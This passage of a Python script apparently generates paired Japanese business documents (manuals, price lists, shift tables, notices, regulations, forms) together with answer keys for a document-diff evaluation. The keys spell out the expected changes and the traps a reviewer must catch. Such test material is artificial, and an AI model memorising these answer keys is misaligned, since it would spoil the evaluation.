           '【章の順番の入れ替え】第5版の「第5章 値引きと廃棄」「第6章 衛生管理と清掃」が、第6版では「第5章 衛生管理と清掃」「第6章 値引きと廃棄」。節の番号（5.1〜5.3 ↔ 6.1〜6.3）と図の番号（図5-1 ↔ 図6-1）も入れ替わる。章の中身は、下に挙げる数字のほかは同じ（＝移動しただけの文を、削除と追加として大量に出さないこと）。'
           'この入れ替えに合わせて、ほかの章からの参照も変わる：第3章 3.3 の最後「値引きと廃棄の方法は、第5章による」→「第6章」、第8章 8.1 の手順3「（第5章）」→「（第6章）」',
           '【手順の追加で番号がずれる】①第1章 1.1：手順4「アレルゲン表示（特定原材料8品目）のラベルが…」を追加。もとの手順4〜9が 5〜10 になる（文は同じで番号だけ変わるものが4つ。番号と数字の両方が変わるものが2つ＝下の品ぞろえ率と朝礼）　'
           '②第8章 8.1：手順5「冷蔵・冷凍ケースの温度を、「温度記録表」（様式2）に記入する（閉店前の記録）。」を追加。もとの手順5〜9が 6〜10 になる（文は同じ）',
           '【時刻・温度・日数などの数字】第1章：開店の90分前→105分前／温度の記録「1日3回：開店前・14時・閉店前」→「1日4回：開店前・11時・15時・閉店前」／品ぞろえ率 80％→90％／朝礼 開店の5分前→10分前／時間割の表 7:30→7:15、7:40→7:25、「7:40 アレルゲン表示の確認」の行を追加、朝礼 8:55→8:50／図1-1 の説明に「アレルゲン表示 →」を追加',
           '第2章：期限まで 30日→45日／手書きの POP の確認「売場責任者」→「店長」／売場の点検 16:00→15:30　　第3章：冷蔵（日配品・乳製品・飲料）10℃以下→8℃以下／記録「1日3回」→「1日4回」（表の4行）／基準を超えていた時間 2時間→1時間／温度計のずれ ±1.0℃→±0.5℃／刺身 6時間→5時間で下げる',
           '第4章：商品券の額面に「・5,000円」を追加／1万円札 10枚→5枚／違算 500円→300円／返品 7日→14日　　値引きと廃棄の章：惣菜・弁当 18:00→17:30／日配品 10％→20％／廃棄の金額 10,000円→8,000円　　衛生管理と清掃の章：手洗い 20秒→30秒／トイレの清掃 1日3回→1日4回',
           '第7章：事故報告書 24時間→12時間（7.2 の文と、7.3 の表「24時間以内」→「12時間以内」の2か所）　　第8章：閉店の放送「15分前に」→「30分前と10分前に」／時間割の表 20:45→20:30 と「（1回目）」、「20:50 閉店の店内放送（2回目）」の行を追加、施錠 22:00→22:15／金庫の現金 300万円→200万円　　'
           '第9章：非常食・飲料水「従業員の3日分」→「従業員の3日分と、帰宅できないお客様 50人の1日分」／避難訓練 6月と11月→5月と11月　　付録：様式2 の保存 1年→3年／「様式10 カスタマーハラスメント記録票 3年」の行を追加／品質管理課 内線 3305→3310',
           '【1ページの追加】第7章の最後に「7.4 カスタマーハラスメントへの対応」（説明の文・表6行・手順5つ・注意の囲み・図7-2）を新設。改ページして1ページにまとめてあるので、これより後ろのページが1ページずつずれる',
           f'研修用スライド（PowerPoint）第5版（{len(s5)} 枚）→ 第6版（{len(s6)} 枚）：中身はマニュアルと同じ文（表は「｜」で区切った行、注意は【注意】、図は説明の文だけ）で、変更も上と同じ。1枚に 8 行までで区切っているので、手順を追加した節（1.1・8.1）は、次のスライドへ送られる行がある。'
           '増えた2枚は、7.4（カスタマーハラスメント）の2枚。PDF とスライドで、同じ変更が同じように見つかること')

    # ---- 価格表（Excel、1,500 SKU）
    old, new, up, gone, added, taxj, color = _sku16(); fo, fn = '価格表_2026年11月.xlsx', '価格表_2026年12月改定.xlsx'
    _book16(f'{d}/{fo}', old, '価格表 2026年11月'); _book16(f'{d}/{fn}', new, '価格表 2026年12月改定', yellow=set(color[:6]), red=set(color[6:]))
    orow = {r['jan']: i + 2 for i, r in enumerate(old)}; nrow = {r['jan']: i + 2 for i, r in enumerate(new)}; om = {r['jan']: r for r in old}; nw = {r['jan']: r for r in new}
    same = lambda j: all(om[j][k] == nw[j][k] for k in ('name', 'spec', 'price', 'tax', 'date', 'kind'))
    assert sum(1 for j in om if j in nw and om[j]['price'] != nw[j]['price']) == 120 and all(nw[j]['price'] > om[j]['price'] for j in up) and len(set(om) - set(nw)) == 15 and len(set(nw) - set(om)) == 20
    assert sum(1 for j in om if j in nw and om[j]['tax'] != nw[j]['tax']) == 3 and all(same(j) for j in color) and sum(1 for j in om if j in nw and not same(j)) == 123
    key(d, f'価格表（Excel。「価格表」シートの1行目が見出し。旧は 1,500 SKU＝2〜1501行、新は 1,505 SKU＝2〜1506行。部門の順・JAN の順に並ぶ。F列「税込売価」は =ROUND(E列×1.08,0) または ×1.1 の数式。「凡例」シートは題名の1つのセルだけが違う）{fo} → {fn}',
           f'値上げ 120 SKU：E列（税抜売価）・F列（税込売価の値。数式は同じ）・H列（売価変更日 → 2026/12/01）の3つのセルが変わる。新ファイルの行番号：' + '、'.join(str(nrow[j]) for j in sorted(up, key=lambda j: nrow[j])),
           '終売（行の削除）15 SKU。旧ファイルの行番号と品名：' + '、'.join(f'{orow[j]}（{om[j]["name"]} {om[j]["spec"]}）' for j in sorted(gone, key=lambda j: orow[j])),
           '新商品（行の挿入）20 SKU。I列が「新商品」、売価変更日 2026/12/01。新ファイルの行番号と品名：' + '、'.join(f'{nrow[j]}（{nw[j]["name"]} {nw[j]["spec"]}）' for j in sorted(added, key=lambda j: nrow[j])),
           '税率区分の変更 3 SKU（G列の文字、F列の数式の 1.08 ↔ 1.1 とその値、H列の売価変更日 → 2026/12/01。税抜売価は同じ）：' + '、'.join(
               f'{om[j]["name"]}（旧 {orow[j]}行→新 {nrow[j]}行。{"軽減8%→標準10%" if nw[j]["tax"] == 10 else "標準10%→軽減8%"}、税込 {_incl16(om[j])}→{_incl16(nw[j])}）' for j in sorted(taxj, key=lambda j: orow[j])),
           '**書式（色）だけの変更 10 セル（値・数式は旧と同じ＝中身の差は出ないのが正しい。色の違いに気づけるか、気づけないなら、そのことが分かるか）**：新ファイルで品名のセルが黄色になったもの 6 つ＝' + '、'.join(f'C{x}' for x in sorted(nrow[j] for j in color[:6]))
           + '／税抜売価の文字が赤になったもの 4 つ＝' + '、'.join(f'E{x}' for x in sorted(nrow[j] for j in color[6:])) + '。（「特売対象」の薄い橙色は、旧にも新にもある）',
           '行の挿入・削除で、それより下の行は行番号がずれ、F列の数式の参照（E○）もずれる。ずれただけの行（中身が同じ 1,352 行）を「変更」にしないこと。中身が変わった行は、値上げ 120＋税率 3＝123 行、削除 15 行、挿入 20 行')

    # ---- POP（画像）
    _pop16(f'{d}/POP_週末特売_たまご_初版.png', 0); _pop16(f'{d}/POP_週末特売_たまご_修正版.png', 1)
    key(d, 'POP（PNG、A4・300dpi＝2480×3508、位置ずれなし）POP_週末特売_たまご_初版.png → 修正版.png：大きな価格 ¥198→¥218／その下の（税込 214円）→（税込 235円）／下の小さな注記の日付「12月5日（土）・6日（日）」→「12月6日（日）・7日（月）」／'
           '色＝上の帯・外枠・「おひとり様 1パック限り」・右下の店名が、赤→橙（価格の数字は赤のまま）。小さな注記（文字の大きさ 58 画素。A4 に刷ると約 5mm）の違いを、大きな数字の違いに埋もれさせずに見つけられること')

    # ---- シフト表（Excel）
    staff = [(n, dp) for dp, ns in (('青果', ['安達 洋子', '今村 剛', '宇野 美咲']), ('鮮魚', ['江口 誠', '大塚 里奈', '岡本 拓也']), ('精肉', ['片山 修', '菊池 麻衣']), ('惣菜', ['工藤 恵', '小松 春香', '坂口 亮', '篠原 由美']), ('日配', ['須藤 大輔', '関口 彩']),
                                             ('グロサリー', ['高野 浩', '千葉 美穂', '津田 健太']), ('レジ', ['寺田 久美子', '土屋 翔', '永井 智子', '西川 優', '野村 加奈', '長谷川 涼', '平田 真由美'])) for n in ns]
    T = {'早': (420, 960), '中': (540, 1080), '遅': (780, 1320), '午前': (540, 780), '夕方': (1020, 1260)}; grid = []
    for i in range(len(staff)):
        part = i % 3 == 2; offs = set(rnd.sample(range(7), 3 if part else 2)); grid.append([None if k in offs else T[rnd.choice(['午前', '夕方'] if part else ['早', '中', '中', '遅'])] for k in range(7)])
    g2 = [list(r) for r in grid]; find = lambda k, t, skip=(): next(i for i in range(len(staff)) if grid[i][k] == T[t] and i not in skip)
    a = find(1, '中'); g2[a][1] = (510, 1080); b = find(3, '中', (a,)); g2[b][3] = (540, 1140); c = find(4, '遅', (a, b)); g2[c][4] = (720, 1260)
    e1 = find(5, '早', (a, b, c)); e2 = find(5, '遅', (a, b, c, e1)); g2[e1][5], g2[e2][5] = g2[e2][5], g2[e1][5]
    f = next(i for i in range(len(staff)) if grid[i][2] is None and grid[i][3] == T['中'] and i not in (a, b, c, e1, e2)); g2[f][2], g2[f][3] = T['中'], None
    _shift16(f'{d}/シフト表_緑が丘店_11月30日週_初版.xlsx', grid, staff, 'かえで台ストア 緑が丘店　シフト表　2026年11月30日（月）〜12月6日（日）')
    _shift16(f'{d}/シフト表_緑が丘店_11月30日週_改訂.xlsx', g2, staff, 'かえで台ストア 緑が丘店　シフト表　2026年11月30日（月）〜12月6日（日）【11月27日 改訂】')
    hrs = lambda g, i: sum(x[1] - x[0] for x in g[i] if x) / 60; row = lambda i: i + 4; nm = lambda i: staff[i][0]
    assert [i for i in range(len(staff)) if hrs(grid, i) != hrs(g2, i)] == sorted([a, b]) and sum(1 for i in range(len(staff)) for k in range(7) if grid[i][k] != g2[i][k]) == 7
    key(d, f'シフト表（Excel。4行目から {len(staff)} 人。C〜P列が7日分の「出勤・退勤」で、時刻は h:mm の表示（9:00 など）。休みは2つのセルを結合して「休」。色＝早番 水色・中番 白・遅番 橙・短時間 黄・休 灰。Q列は週の勤務時間の数式）初版 → 改訂：1行目の題名に「【11月27日 改訂】」',
           f'時刻の変更 3 人：{nm(a)}（{row(a)}行）12/1（火）出勤 9:00→8:30（E{row(a)}。週の勤務 {hrs(grid, a):.1f}→{hrs(g2, a):.1f} 時間＝Q{row(a)}）／{nm(b)}（{row(b)}行）12/3（木）退勤 18:00→19:00（J{row(b)}。週の勤務 {hrs(grid, b):.1f}→{hrs(g2, b):.1f} 時間＝Q{row(b)}）／'
           f'{nm(c)}（{row(c)}行）12/4（金）13:00〜22:00→12:00〜21:00（K{row(c)}・L{row(c)}。勤務時間は同じ）',
           f'担当者の入れ替え：12/5（土）の {nm(e1)}（{row(e1)}行、早番 7:00〜16:00）と {nm(e2)}（{row(e2)}行、遅番 13:00〜22:00）を入れ替え（M・N列の4つのセル。色も入れ替わる。勤務時間は同じ）／'
           f'休みの入れ替え：{nm(f)}（{row(f)}行）12/2（水）休→9:00〜18:00、12/3（木）9:00〜18:00→休（G〜J列。結合セルの位置が変わる。勤務時間は同じ）。変わった「人と日」の組は 7 つ、Q列の値が変わるのは 2 人だけ')

    # ---- 本部通達（Shift_JIS・CRLF・機種依存文字）
    A = ['店舗各位', '　　　　　　　　　　　　　　　　　　　　通達 第2026-118号', '　　　　　　　　　　　　　　　　　　　　2026年11月20日', '　　　　　　　　　　　　　　　　　　　　㈱かえで台ストア　店舗運営部', '',
         '件名：年末商戦（第Ⅲ期）の売場づくりと売価の変更について', '', '　年末商戦（第Ⅲ期）について、下記のとおり通達する。各店は、内容を全従業員（ﾊﾟｰﾄ・ｱﾙﾊﾞｲﾄを含む）へ周知すること。', '', '記', '',
         '１．実施の期間', '　①　2026年12月1日（火）～12月31日（木）', '　②　売価の変更は、12月1日（火）の開店時から適用する。', '　③　棚札の差し替えは、11月30日（月）の閉店後に行う。', '',
         '２．売価を変更するおもな商品（詳しくは、別紙①「価格表 2026年12月改定」による）', '　・サラダ油（1㍑）　　税抜 398円 → 428円', '　・牛乳（1㍑パック）　税抜 218円 → 228円', '　・しょうゆ（1㍑）　　税抜 298円 → 318円', '　・精米 こしひかり（5㎏）　税抜 2,480円 → 2,680円', '',
         '３．特売', '　・たまご Mサイズ10個　税抜 198円（12月5日（土）・6日（日）の2日間。おひとり様1パック限り）', '　・灯油（ｶﾞｿﾘﾝｽﾀﾝﾄﾞ併設の3店舗）　18㍑ 1缶 2,180円（税込）', '　・ﾎﾟｲﾝﾄ5倍ﾃﾞｰ　毎週火曜日（12月は 1日・8日・15日・22日・29日）', '',
         '４．売場', '　・第Ⅲ期の棚割は、別紙②「棚割表Ⅲ」による。', '　・エンド（通路の端の棚）は、鍋つゆ → もち → 年越しそば の順に入れ替える。', '　・冷蔵ケースの温度の記録は、12月1日から1日4回とする（店舗運営マニュアル 第6版）。', '',
         '５．報告', '　・売価の変更が終わった店舗は、12月1日（火）10時までに、店舗運営部へ報告する。', '　・欠品・納品の遅れは、そのつど商品部（内線 2410）へ連絡する。', '',
         '６．問い合わせ先', '　店舗運営部　中谷　℡ 03-5555-0162（内線 2231）', '　ＦＡＸ 03-5555-0163', '', '以上']
    B = list(A); CH = []
    def rep(old, new, why):
        i = _ln(A, old); j = _ln(B, old) - 1; B[j] = B[j].replace(old, new); CH.append(f'{i}行目 {why}'); return i
    rep('2026年11月20日', '2026年11月25日', '日付 11月20日→11月25日'); rep('㈱かえで台ストア', '株式会社かえで台ストア', '「㈱」（1文字）→「株式会社」')
    rep('①　2026年12月1日', '(1)　2026年12月1日', '「①」→「(1)」'); rep('②　売価の変更は', '(2)　売価の変更は', '「②」→「(2)」'); rep('③　棚札の差し替え', '(3)　棚札の差し替え', '「③」→「(3)」')
    rep('別紙①「価格表', '別紙1「価格表', '「別紙①」→「別紙1」（丸数字→ふつうの数字）'); rep('サラダ油（1㍑）', 'サラダ油（1リットル）', '「㍑」（1文字）→「リットル」'); rep('298円 → 318円', '298円 → 328円', '金額 318円→328円（「㍑」はそのまま）')
    rep('（5㎏）', '（5kg）', '「㎏」（1文字）→「kg」'); rep('12月5日（土）・6日（日）', '12月6日（日）・7日（月）', '特売の日 12月5日（土）・6日（日）→12月6日（日）・7日（月）'); rep('2,180円', '2,280円', '灯油の金額 2,180円→2,280円（半角カナと「㍑」はそのまま）')
    w1 = rep('ﾎﾟｲﾝﾄ5倍ﾃﾞｰ', 'ポイント5倍デー', '半角カナ「ﾎﾟｲﾝﾄ5倍ﾃﾞｰ」→全角カナ「ポイント5倍デー」（★幅だけの違い）'); rep('「棚割表Ⅲ」', '「棚割表III」', 'ローマ数字「Ⅲ」（1文字）→「III」（英字3つ）。同じ行の「第Ⅲ期」「別紙②」はそのまま')
    rep('10時までに', '12時までに', '報告の期限 10時→12時'); rep('℡ 03-5555-0162', 'TEL 03-5555-0162', '「℡」（1文字）→「TEL」'); w2 = rep('ＦＡＸ 03-5555-0163', 'FAX 03-5555-0163', '全角の英字「ＦＡＸ」→半角「FAX」（★幅だけの違い）')
    ins = _ln(B, '件名：'); B.insert(ins, '※ 11月20日付の同じ番号の通達は、この通達に差し替える（特売の日・灯油としょうゆの金額・報告の期限を訂正）。')
    fa, fb = '本部通達_第2026-118号.txt', '本部通達_第2026-118号_訂正版.txt'
    text(f'{d}/{fa}', '\n'.join(A) + '\n', enc='shift_jis', eol='\r\n'); text(f'{d}/{fb}', '\n'.join(B) + '\n', enc='shift_jis', eol='\r\n'); assert _only(A, B) == (16, 17) and len(A) == 41 and len(B) == 42
    fw = lambda s: re.sub('[＀-￯　]+', lambda m: unicodedata.normalize('NFKC', m.group()), s)   # 文字の幅だけをそろえる（全角の英数字・記号と半角、半角カナと全角カナ、全角の空白）
    still = [i + 1 for i in range(len(A)) if A[i] != B[i + (1 if i >= ins else 0)] and fw(A[i]) != fw(B[i + (1 if i >= ins else 0)])]; assert len(still) == 14 and w1 not in still and w2 not in still
    key(d, f'本部通達（テキスト。Shift_JIS・CRLF。旧 41 行・訂正版 42 行。機種依存文字＝丸数字 ①②③、㈱、㍑、㎏、℡、ローマ数字 Ⅲ、半角カナ を含む。文字化けせずに読めること）{fa} → {fb}：変更 16 行＋追加 1 行。行番号は旧ファイルのもの（訂正版では、{ins + 1}行目より下が1行ずれる）',
           '変更：' + '／'.join(CH), f'追加：訂正版の{ins + 1}行目「※ 11月20日付の同じ番号の通達は、この通達に差し替える…」',
           f'**比較の条件「全角半角を区別しない」にしたとき**：★の2行（{w1}行目の半角カナ、{w2}行目の全角英字）は、文字の幅だけの違いなので「同じ」になってよい。残りの 14 行は違いとして残るのが正しい。'
           'とくに、「①」と「(1)」「1」、「㍑」と「リットル」、「㎏」と「kg」、「㈱」と「株式会社」、「℡」と「TEL」、「Ⅲ」と「III」は、別の文字なので、同じとみなしてはいけない（見落としになる）',
           'このレビュアーは、専門用語が苦手。画面とレポートの言葉が、店長にそのまま渡せる言葉になっているかも見る')

    def post():
        from pypdf import PdfReader
        info = {}
        for v in (5, 6):   # Chrome の PDF は、一部の漢字が部首の符号で取り出されることがあるので、NFKC でそろえてから章の見出しを探す
            r = PdfReader(P(f'{d}/店舗運営マニュアル_第{v}版.pdf')); tx = [re.sub(r'\s+', '', unicodedata.normalize('NFKC', p.extract_text())) for p in r.pages]; cover, chapters = _m16(v)
            st = {t: next(i + 1 for i, s in enumerate(tx) if i > 0 and re.sub(r'\s+', '', unicodedata.normalize('NFKC', _m16_head(n, t))) in s) for n, t, _ in chapters}; info[v] = (len(tx), st, [f'{_m16_head(n, t)}＝{st[t]}' for n, t, _ in chapters])
            if v == 6: kasu = next(i + 1 for i, s in enumerate(tx) if '7.4カスタマーハラスメントへの対応' in s)
        assert info[6][0] == info[5][0] + 1, (info[5][0], info[6][0])
        key(d, f'（マニュアルのページ数）第5版 {info[5][0]} ページ、第6版 {info[6][0]} ページ。追加された1ページは、第6版の {kasu} ページ目（7.4）。章の始まるページ：第5版 ' + '、'.join(info[5][2]) + '／第6版 ' + '、'.join(info[6][2]))
    POST.append(post)


# ==========================================================================================
# R17 総務部：キーボードだけで操作する人（題材は小さめ。操作の確認用）
# ==========================================================================================
def r17(d):
    rnd = random.Random(1717)
    # ---- 議事録（テキスト）
    A = ['安全衛生委員会 議事録（案）', '開催日時：2026年11月18日（水）15:00〜16:10', '場所：本社 3階 第2会議室',
         '出席者：委員長 大久保（工場長）、産業医 藤枝、衛生管理者 宮原、委員 相沢・桑田・野々村・長尾・比嘉・守屋　計9名', '欠席者：委員 柳瀬（出張）', '記録：総務部 宮原', '',
         '1. 前回議事録の確認', '　前回（10月21日）の議事録を確認し、承認した。', '',
         '2. 労働災害の報告（10月分）', '　休業災害 0件、不休災害 1件、ヒヤリハット 14件。', '　不休災害：10月9日、第2工場の梱包ラインで、カッターによる左手人差し指の切創（全治5日）。', '　対策：安全カッターへの切り替え（11月末までに全ライン 60本）。', '',
         '3. 職場巡視の結果', '　11月5日に第1工場を巡視した。指摘は5件。', '　(1) 通路にパレットがはみ出している（プレス課）', '　(2) 消火器の前に台車が置かれている（組立課）', '　(3) 保護めがねの未着用 2名（研磨課）', '　(4) 配電盤の扉が開いたまま（保全課）', '　(5) 休憩室の換気扇が動いていない（総務部）',
         '　是正の期限：11月28日。次回の委員会で確認する。', '',
         '4. 健康診断の結果', '　定期健康診断の受診率は 96.4％（対象 412名、受診 397名）。未受診の15名には、12月12日までに受診するよう個別に連絡する。', '　有所見率は 58.2％（前年 56.9％）。産業医から、血圧と脂質の項目で所見が増えているとの説明があった。', '',
         '5. ストレスチェック', '　実施期間は 11月4日〜11月17日。回答率は 91.0％。高ストレス者の面接指導は、12月に産業医が行う。', '',
         '6. その他', '　年末年始の安全パトロールを、12月24日に行う。', '　インフルエンザの予防接種の補助（1人 2,000円）の申請は、12月25日まで。', '',
         '次回：2026年12月16日（水）15:00〜　本社 3階 第2会議室', '以上']
    B = list(A)
    def rep(old, new):
        i = _ln(B, old) - 1; B[i] = B[i].replace(old, new)
    rep('議事録（案）', '議事録'); rep('15:00〜16:10', '15:00〜16:25'); rep('比嘉・守屋　計9名', '比嘉・守屋・柳瀬　計10名'); rep('欠席者：委員 柳瀬（出張）', '欠席者：なし')
    rep('全治5日', '全治7日'); rep('全ライン 60本', '全ライン 80本'); rep('指摘は5件', '指摘は6件'); rep('未着用 2名', '未着用 3名')
    B.insert(_ln(B, '(5) 休憩室'), '　(6) 脚立の天板に乗って作業している（保全課）')
    rep('96.4％（対象 412名、受診 397名）。未受診の15名', '96.8％（対象 412名、受診 399名）。未受診の13名'); del B[_ln(B, 'インフルエンザ') - 1]; rep('12月16日（水）', '12月17日（木）')
    fa, fb = '議事録_安全衛生委員会_2026年11月_案.txt', '議事録_安全衛生委員会_2026年11月_確定.txt'
    text(f'{d}/{fa}', '\n'.join(A) + '\n'); text(f'{d}/{fb}', '\n'.join(B) + '\n')
    assert _only(A, B) == (11, 11) and len(A) == 37 and len(B) == 37
    key(d, f'議事録（UTF-8・LF、どちらも 37 行）{fa} → {fb}：変更 10 行＋追加 1 行＋削除 1 行。'
           f'1行目「（案）」を削除／2行目 16:10→16:25／4行目 出席者に柳瀬を追加・計9名→計10名／5行目 欠席者「委員 柳瀬（出張）」→「なし」／{_ln(A, "全治5日")}行目 全治5日→全治7日／{_ln(A, "60本")}行目 60本→80本／'
           f'{_ln(A, "指摘は5件")}行目 指摘は5件→6件／{_ln(A, "未着用 2名")}行目 未着用 2名→3名／確定の{_ln(B, "(6) 脚立")}行目に「(6) 脚立の天板に…」を追加／{_ln(A, "96.4％")}行目 96.4％→96.8％・397名→399名・15名→13名／'
           f'案の{_ln(A, "インフルエンザ")}行目「インフルエンザの予防接種の補助…」を削除／最終行の1つ前 12月16日（水）→12月17日（木）')

    # ---- 社内規程（Word）：現行・改定案・変更履歴つき
    T = lambda *parts: ('trk', list(parts))
    R = ['## 第1章　総則', '（目的）', '第1条　この規程は、北浜精機株式会社（以下「会社」という。）の従業員及びその家族の慶弔、傷病又は災害に際して支給する慶弔見舞金について定める。',
         '（適用範囲）', T(('', '第2条　この規程は、正社員'), ('ins', '、嘱託社員'), ('', '及び勤続1年以上の契約社員に適用する。')),
         '（申請）', T(('', '第3条　慶弔見舞金の支給を受けようとする者は、事由の発生した日から'), ('del', '30日'), ('ins', '60日'), ('', '以内に、所定の申請書に証明する書類を添えて、総務部に提出しなければならない。')),
         '2　申請書の様式は、総務部長が別に定める。',
         '## 第2章　祝金', '（結婚祝金）', T(('', '第4条　従業員が結婚したときは、結婚祝金として'), ('del', '30,000円'), ('ins', '50,000円'), ('', 'を支給する。')), '2　従業員どうしが結婚したときは、それぞれに支給する。',
         '（出産祝金）', T(('', '第5条　従業員又はその配偶者が出産したときは、出産祝金として子1人につき'), ('del', '10,000円'), ('ins', '20,000円'), ('', 'を支給する。')),
         T(('ins', '（入学祝金）')), T(('ins', '第6条　従業員の子が小学校に入学したときは、入学祝金として子1人につき10,000円を支給する。')),
         '## 第3章　弔慰金', '（従業員の死亡）', T(('', '第'), ('del', '6'), ('ins', '7'), ('', '条　従業員が死亡したときは、別表に定める弔慰金を遺族に支給する。')),
         '（家族の死亡）', T(('', '第'), ('del', '7'), ('ins', '8'), ('', '条　従業員の家族が死亡したときは、別表に定める弔慰金を支給する。')), '2　前項の家族とは、配偶者、子及び父母（配偶者の父母を含む。）をいう。',
         '## 第4章　見舞金', '（傷病見舞金）', T(('', '第'), ('del', '8'), ('ins', '9'), ('', '条　従業員が業務外の傷病により引き続き'), ('del', '14日'), ('ins', '10日'), ('', '以上休業したときは、傷病見舞金として10,000円を支給する。')),
         '（災害見舞金）', T(('', '第'), ('del', '9'), ('ins', '10'), ('', '条　従業員の住居が火災、風水害、地震その他の災害により被害を受けたときは、次の区分により災害見舞金を支給する。')),
         '(1) 全焼・全壊・流失　100,000円', '(2) 半焼・半壊　50,000円', T(('', '(3) 一部の損壊・床上浸水　'), ('del', '10,000円'), ('ins', '20,000円')),
         '## 第5章　雑則', '（重複の扱い）', T(('', '第'), ('del', '10'), ('ins', '11'), ('', '条　同一の事由について、2人以上の従業員が支給の対象となるときは、そのうちの1人に支給する。ただし、結婚祝金については、この限りでない。')),
         '（規程の改廃）', T(('', '第'), ('del', '11'), ('ins', '12'), ('', '条　この規程の改廃は、'), ('del', '取締役会の決議'), ('ins', '経営会議の承認'), ('', 'による。')),
         '附　則', T(('', 'この規程は、'), ('del', '2019年4月1日'), ('ins', '2027年1月1日'), ('', 'から施行する。')),
         T(('', '別表（第'), ('del', '6'), ('ins', '7'), ('', '条・第'), ('del', '7'), ('ins', '8'), ('', '条関係）')),
         ('table', [['区分', '弔慰金の額', '供花'], ['従業員本人（業務上）', '1,000,000円', '会社名で1対'], ['従業員本人（業務外）', '300,000円', '会社名で1対'], ['配偶者', '50,000円', '会社名で1基'], ['子', '30,000円', '会社名で1基'], ['父母', '20,000円', '―']])]
    kw = dict(header='北浜精機株式会社　規程集　人事・労務編', author='総務部 宮原', date='2026-11-20T02:15:00Z')
    rdocx(f'{d}/慶弔見舞金規程_現行.docx', '慶弔見舞金規程', _trk_orig(R), **kw); rdocx(f'{d}/慶弔見舞金規程_改定案.docx', '慶弔見舞金規程', trk_final(R), **kw)
    rdocx(f'{d}/慶弔見舞金規程_改定案（変更履歴つき）.docx', '慶弔見舞金規程', R, **kw)
    n_ins = sum(1 for b in R if isinstance(b, tuple) and b[0] == 'trk' for k, t in b[1] if k == 'ins'); n_del = sum(1 for b in R if isinstance(b, tuple) and b[0] == 'trk' for k, t in b[1] if k == 'del')
    n_par = sum(1 for b in R if isinstance(b, tuple) and b[0] == 'trk'); assert (n_ins, n_del, n_par) == (18, 15, 15)
    key(d, '社内規程（Word、全12条＋別表）慶弔見舞金規程_現行.docx → 慶弔見舞金規程_改定案.docx：第2条に「、嘱託社員」を追加／第3条 30日→60日／第4条 結婚祝金 30,000円→50,000円／第5条 出産祝金 10,000円→20,000円／'
           '第6条（入学祝金）を新設（見出しと本文の2段落）／このため旧第6条〜第11条が第7条〜第12条に繰り下がる（6つの条の番号）／新第9条（傷病見舞金）14日→10日／新第10条 (3) 10,000円→20,000円／'
           '新第12条「取締役会の決議」→「経営会議の承認」／附則 2019年4月1日→2027年1月1日／別表の見出し（第6条・第7条関係）→（第7条・第8条関係）。別表の中身は同じ',
           f'慶弔見舞金規程_改定案（変更履歴つき）.docx：上と同じ変更が、変更履歴（挿入 {n_ins} か所・削除 {n_del} か所、{n_par} 段落）として残っている。すべて承諾すると「改定案」と同じ本文、すべて元に戻すと「現行」と同じ本文になる。'
           '変更履歴が残っていることが知らされること、削除された文字（30日・30,000円など）を見落とさないこと')

    # ---- 申請書（PDF 3ページ）
    def shinsei(v):
        q = 5 if v else 4
        items = [['ノートパソコン（14型）', 'NB-1450K', q, 148000], ['液晶モニター（24型）', 'LM-2420', q, 24800], ['ワイヤレスマウス', 'WM-310', q, 2480]] + ([['USB-C ドッキングステーション', 'DS-720C', 5, 12800]] if v else [])
        sub = sum(r[2] * r[3] for r in items); tax = sub // 10
        b = [('raw', f'<p class="r">申請日　2026年11月{"19" if v else "10"}日</p>'), '# 備品購入申請書' + ('（再提出）' if v else ''),
             ('table', [['申請部署', '総務部 総務課'], ['申請者', '宮原 さやか（内線 2104）'], ['件名', '総務課 事務用パソコンの更新'], ['予算科目', '消耗品費（10万円未満）／器具備品（10万円以上）'], ['希望納期', '2026年12月' + ('18日（金）' if v else '10日（木）')], ['購入先', '東都オフィスサプライ株式会社']], 'nohead'),
             '## 1　購入する物品', ('table', [['品名', '型式', '数量', '単価（税抜）', '金額（税抜）']] + [[r[0], r[1], f'{r[2]}台' if 'マウス' not in r[0] else f'{r[2]}個', yen(r[3]) + '円', yen(r[2] * r[3]) + '円'] for r in items]
                                + [['小計', '', '', '', yen(sub) + '円'], ['消費税（10％）', '', '', '', yen(tax) + '円'], ['合計', '', '', '', yen(sub + tax) + '円']]),
             '※ 1件 10万円以上の物品は、固定資産台帳に登録する（経理規程 第24条）。', '---pb---',
             '## 2　見積の比較（ノートパソコン 1台あたり、税抜）',
             ('table', [['業者', '単価', '納期', '保守', '備考'], ['東都オフィスサプライ株式会社', '148,000円', '発注から3週間', '3年（訪問修理）', '現在の取引先'],
                        ['北浜電機商会', '149,800円' if v else '151,500円', '発注から2週間', '3年（引き取り修理）', '再見積で値下げ' if v else ''], ['みなとOAシステム株式会社', '146,000円', '発注から6週間', '1年（引き取り修理）', '納期が希望に合わない']]),
             '　3社の見積を比べた結果、価格と保守の内容から、東都オフィスサプライ株式会社を選んだ。みなとOAシステム株式会社は最も安いが、納期が6週間で、年内に間に合わない。',
             '## 3　承認', ('table', [['課長', '部長', '経理部長', '担当役員'], ['　', '　', '　', '（100万円以上のとき）' if not v else '要（合計が100万円以上のため）']]), '---pb---',
             '## 4　購入の理由', f'　総務課で使っているノートパソコン {q}台は、2020年10月に購入したもので、6年が過ぎている。起動に5分以上かかり、給与計算ソフトの新しい版（2027年1月から）の動作条件（メモリー 16GB 以上）を満たしていない。',
             '　修理の受付は2026年3月で終わっており、故障したときに業務が止まるおそれがある。' + ('11月12日に1台の電源が入らなくなり、いまは予備機でしのいでいる。' if v else ''),
             '## 5　設置する場所', '　本社 2階 総務課の執務室（いまの機器と入れ替える）。' + ('ドッキングステーションは、フリーアドレス席（5席）に置く。' if v else ''),
             '## 6　いまの機器の扱い', f'　いまのノートパソコン {q}台は、データを消したうえで、情報システム課を通じて廃棄する（廃棄の証明書を受け取る）。モニターは、状態のよい2台を予備として残す。']
        return page(hb(b), serif=False, size='11pt'), sub, tax
    mm = {'top': '22mm', 'bottom': '20mm', 'left': '20mm', 'right': '20mm'}
    (h0, s0, t0), (h1, s1, t1) = shinsei(0), shinsei(1)
    for nm, h in (('備品購入申請書_初版.pdf', h0), ('備品購入申請書_再提出.pdf', h1)):
        cpdf(f'{d}/{nm}', h, margin=mm, display_header_footer=True, header_template=hf('北浜精機株式会社　様式 総-12', ''), footer_template=hf('', '{p} / {n}'))
    key(d, f'申請書（PDF 3ページ）備品購入申請書_初版.pdf → 備品購入申請書_再提出.pdf：【1ページ】申請日 11月10日→11月19日／題名に「（再提出）」／希望納期 12月10日（木）→12月18日（金）／数量 4台→5台（パソコン・モニター）・4個→5個（マウス）と各金額／'
